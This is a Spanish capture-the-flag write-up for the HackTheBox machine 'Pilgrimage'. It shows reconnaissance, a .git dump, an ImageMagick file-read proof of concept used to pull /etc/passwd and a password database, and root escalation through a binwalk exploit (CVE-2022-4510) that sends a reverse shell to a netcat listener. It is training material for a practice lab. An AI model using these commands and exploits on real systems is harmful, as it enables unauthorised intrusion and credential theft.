---
title: HackTheBox - Pilgrimage
author: cotes
date: 2023-09-06 17:51:00 +0800
categories: [Writeup, HackTheBox, Easy]
tags: [Linux, 'Information Leakage', 'Binwalk (CVE-2022-4510)', 'File Upload']
math: true
mermaid: true
image:
  path: /assets/images/HTB/Easy/Pilgrimage/logo.jpg
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Pilgrimage Machine Logo
---

Máquina Linux de nivel **Easy** de HackTheBox.

Técnicas usadas: **Information Leakage, Binwalk (CVE-2022-4510), File Upload**


### Fase de Reconocimiento 🧣

a. Enumeramos los puertos que están abiertos en la **Máquina Pilgrimage**

* **`nmap -p- -sS -Pn -n <IP> -oG puertos`**

    ![](/assets/images/HTB/Easy/Pilgrimage/01-ports.png)

b. Vemos las versiones de los servicios que se están ejecutando en los puertos.

* **`nmap -p<Ports>  <IP> -oN versiones`**

    ![](/assets/images/HTB/Easy/Pilgrimage/02-versions.png)

> Añadimos el host **pilgrimage.htb** al archivo **/etc/hosts**.
{: .prompt-info }

c. Visitamos la página web

![](/assets/images/HTB/Easy/Pilgrimage/03-web.png)

* Crearemos una cuenta y testearemos un poco con la subida de archivos. Al no encontrar una vulnerabilidad directa en esta subida de archivos lo que haremos es fuzzear la página web.

    ```bash
    root@kali> wfuzz -c -t 100 --hc=404 -w /usr/share/seclists/Discovery/Web-Content/common.txt -H "PHPSESSID: dgj72pcndth8qrs1otg3hisue0" 'http://pilgrimage.htb/FUZZ/'

    000000024:   403        7 L      9 W        153 Ch      ".htaccess"
    000000008:   403        7 L      9 W        153 Ch      ".git"
    000000013:   403        7 L      9 W        153 Ch      ".git/logs/"
    000000025:   403        7 L      9 W        153 Ch      ".htpasswd"
    000000023:   403        7 L      9 W        153 Ch      ".hta"
    000000729:   403        7 L      9 W        153 Ch      "assets"
    000004169:   403        7 L      9 W        153 Ch      "tmp"
    000004382:   403        7 L      9 W        153 Ch      "vendor"
    ```

* Usaremos [gitdumper](https://github.com/arthaud/git-dumper) para descargarnos el directorio **.git** encontrado. Encontraremos un ejecutable 'magisk' del cual podemos saber la versión

    ```bash
    root@kali> python3 git_dumper.py http://pilgrimage.htb/.git/ pilgrimage_git
    root@kali> cd pilgrimage_git
    root@kali>./magick -usage
    Version: ImageMagick 7.1.0-49
    <SNIP>
    ```

* Al buscar por vulnerabilidades asociadas a este ejecutable damos con este [exploit](https://github.com/Sybil-Scan/imagemagick-lfi-poc) el cual nos permite leer archivos.

    ```bash
    root@kali> python generate.py -f "/etc/passwd" -o marmota.png
    ```

* Subimos la imagen al servicio web y luego la descargamos para verificar su contenido

  ```bash
    root@kali> ./magick identify -verbose etc_passwd.png 
    <SNIP>
    726f6f743a783a303a303a[Contenido en Hexadecimal]...
    ```

* Al decodear el contenido veremos el fichero **`/etc/passwd`**, pero lo más interesante es que encontramos al usuario **emily**

    ![](/assets/images/HTB/Easy/Pilgrimage/04-user.png)

* Si indagamos en los archivos del directorio .git descargado antes, encontraremos una ruta (**`$db = new PDO('sqlite:/var/db/pilgrimage')`**) a una base de datos **register.php**, con esto en mente y siguiendo el procedimiento anterior, leeremos este archivo

    ![](/assets/images/HTB/Easy/Pilgrimage/05-pass.png)

d. Con esto, ya nos podemos conectar al servicio SSH

```bash
root@kali>  ssh emily@<IP Pilgrimage>
emily@pilgrimage:~$
```

### Escalada de Privilegios 💹

a. Al buscar por procesos que se estén ejecutando en la máquina vemos el siguiente

```bash
emily@pilgrimage:~$ ps -faux
<SNIP>
root   725  0.0  0.0  6816  2972 ?  Ss   05:52   0:00 /bin/bash /usr/sbin/malwarescan.sh
root   741  0.0  0.0  2516   712 ?  S    05:52   0:00  \_ /usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/
```

* Vemos el contenido de este script

    ```bash
    #!/bin/bash

    blacklist=("Executable script" "Microsoft executable")

    /usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
        filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
        binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
            if [[ "$binout" == *"$banned"* ]]; then
                /usr/bin/rm "$filename"
                break
            fi
        done
    done
    ```

    * El script se activará cada vez que se cree un nuevo archivo en **/var/www/pilgrimage.htb/shrunk**.
    * Luego, se extrae el nombre del archivo.
    * Se usa **/usr/local/bin/binwalk** para extraer data binaria del archivo

b. Si vemos la versión de **binwalk** y consultamos vulnerabilidades sobre esta nos encontraremos con este [CVE-2022-4510](https://www.exploit-db.com/exploits/51249), el cual nos permitirá ejecutar comandos. Para este exploit necesitaremos una imagen cualquiera y luego copiarla al directorio **/var/www/pilgrimage.htb/shrunk** con el fin de activar el script descrito anteriormente

```bash
emily@pilgrimage:~$ python3 exploit.py marmote.jpg 10.10.14.174 443

- Esto creará una imagen binwalk_exploit.png la cual debemos mover a /var/www/pilgrimage.htb/shrunk/
-----------------------------------------------------------------------------------------------------
root@kali> nc -lvnp 443
-----------------------------------------------------------------------------------------------------
emily@pilgrimage:~$ cp binwalk_exploit.png /var/www/pilgrimage.htb/shrunk/
-----------------------------------------------------------------------------------------------------
root@kali> nc -lvnp 443
connect to [10.10.14.174] from (UNKNOWN) [10.10.11.219] 53678
whoami
root
```